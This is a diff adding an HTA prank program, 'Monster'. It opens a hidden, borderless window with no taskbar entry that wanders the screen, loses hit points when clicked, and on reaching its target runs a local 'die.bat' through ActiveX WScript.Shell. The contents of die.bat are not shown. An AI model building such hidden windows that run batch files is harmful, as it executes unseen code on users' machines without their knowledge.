@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <TITLE>Monster</TITLE>
+    <HTA:APPLICATION ID="oHTA"
+     INNERBORDER="no"
+     APPLICATIONNAME="FUCK"
+     BORDER="none"
+     CAPTION="no"
+     ICON=""
+     SCROLL="no"
+     MAXIMIZEBUTTON="no"
+     MINIMIZEBUTTON="no"
+     SHOWINTASKBAR="no"
+     SINGLEINSTANCE="no"
+     SYSMENU="no"
+     VERSION="0.0"
+     WINDOWSTATE="maximize"/>
+
+</head>
+<body oncontextmenu="return false;">
+    <p id="myspan"; style="color:#ffffff">10</p>
+    <div>
+    <img src="Monster.png" 
+     width="90" 
+     height="90" />
+     </div>  
+
+
+    <canvas id="canvasid" width=300; height=300 style="border:0px black"></canvas>
+    <div id="resilt"></div>
+    <style>
+
+        body {
+            margin: 0px;
+            padding: 0px;
+            background-color: black !important;
+     
+            overflow-y:hidden;  
+       
+        }
+        #page {
+	width: 100%;
+	overflow: hidden;
+}
+
+        canvas#canvasid {
+            height: 100%;
+            width: 100%;
+            position: fixed;
+            background: #000000;
+        }
+       html {
+        overflow: auto;
+}
+       div {
+    position:fixed;    
+    z-index:100;
+}
+    </style>
+ 
+    <script>
+        var hp = 10;
+        function getRandomNumber(min, max) {
+            return Math.random() * (max - min) + min
+        }
+        x = top.screenLeft;
+        y = top.screenTop;
+        f = -1
+        var move = true;
+        var toX = Math.round(getRandomNumber(0, 1920));
+       var toY = Math.round(getRandomNumber(0, 1080));
+
+//window.moveTo(0, 880);
+window.resizeTo(100, 100);
+        setInterval(js, 10);
+       
+        setInterval(startmove, 30000);
+        function startmove() {
+            move = true;
+        }
+        toX = Math.round(getRandomNumber(0, 1920));
+        toY = Math.round(getRandomNumber(0, 1080));
+        window.moveTo(toX, toY);
+        toX = 0;
+        toY = 0;
+        setInterval(movetos, 1);
+        function movetos() {
+            x = top.screenLeft;
+            y = top.screenTop;
+            
+            window.moveTo(x, y);
+            if (move == true) {
+                if (x < toX) {
+                    window.moveTo(x + 1, y);
+                }
+                else if (x > toX) {
+                    window.moveTo(x - 1, y);
+                }
+
+                if (y < toY) {
+                    window.moveTo(x, y + 1);
+                }
+                else if (y > toY) {
+                    window.moveTo(x, y - 1);
+                }
+                if (x == toX && y == toY) {
+                    runApp("die.bat");
+;                    move = false;
+                    toX = 0;
+                    toY = 0;
+                }
+                
+            }
+           // setInterval(movetos, 1000);
+            
+        }
+        
+function js() {
+            
+
+   // window.moveTo(x, 880);
+    window.resizeTo(100, 145);
+    
+    // js()
+    
+}
+       
+        function runApp(which) {
+            WshShell = new ActiveXObject("WScript.Shell");
+            WshShell.Run(which, 1, true);
+        }
+var x0, y0;
+
+        hp = 10;
+
+
+        document.onmousedown = function () {
+            hp--;
+            document.getElementById("myspan").innerHTML = "" + hp;
+            if (hp <= 0) {
+                close();
+            }
+            
+}
+    </script>
+
+</body>
+</html>
